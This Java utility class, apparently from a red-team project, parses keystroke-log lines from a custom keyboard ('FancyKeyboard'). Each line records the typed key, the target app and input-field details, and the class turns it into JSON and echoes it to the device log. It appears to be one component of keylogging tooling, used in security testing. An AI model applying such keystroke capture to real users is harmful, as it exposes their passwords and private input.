package ambank.gtr.redteam;

import android.util.Log;

import org.json.JSONObject;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Utility class for log processing and JSON conversion.
 */
public class LogUtils {

    // Pre-compile the regex pattern once to maximize application performance
    private static final Pattern LOG_PATTERN = Pattern.compile(
            "\\[(?<sessionId>[^\\]]+)\\]\\s+Typed\\s+'(?<key>[^']+)'\\s+->\\s+app=(?<appName>[^(]+)\\((?<appId>[^)]+)\\)\\s*\\|\\s*hint=(?<hint>[^|]+?)\\s*\\|\\s*label=(?<label>[^|]+?)\\s*\\|\\s*fieldName=(?<fieldName>[^|]+?)\\s*\\|\\s*fieldId=(?<fieldId>-?\\d+)"
    );

    // Private constructor prevents instantiation since it's a utility class
    private LogUtils() {}

    /**
     * Parses a raw log string and automatically builds an org.json.JSONObject.
     *
     * @param rawLog The raw log string input from your automation/device logs.
     * @return A valid JSONObject if parsed successfully; null if the format mismatches.
     */
    public static JSONObject jsonObjBuilder(String rawLog) {
        if (rawLog == null || rawLog.isBlank()) {
            return null;
        }

        Matcher matcher = LOG_PATTERN.matcher(rawLog);

        if (matcher.find()) {
            Map<String, Object> kwargs = new LinkedHashMap<>();
            kwargs.put("session_id", matcher.group("sessionId").trim());
            kwargs.put("key", matcher.group("key").trim());
            kwargs.put("app_name", matcher.group("appName").trim());
            kwargs.put("app_id", matcher.group("appId").trim());
            kwargs.put("field_hint", matcher.group("hint").trim());

            String fName = matcher.group("fieldName").trim();
            kwargs.put("field_name", "null".equalsIgnoreCase(fName) ? JSONObject.NULL : fName);
            kwargs.put("field_id", Integer.parseInt(matcher.group("fieldId").trim()));
            Log.d("FancyKeyboard", "Parsed JSONObject: " + kwargs);
            return new JSONObject(kwargs);
        } else {
            System.err.println("Log string format mismatch for: " + rawLog);
            return null;
        }
    }
}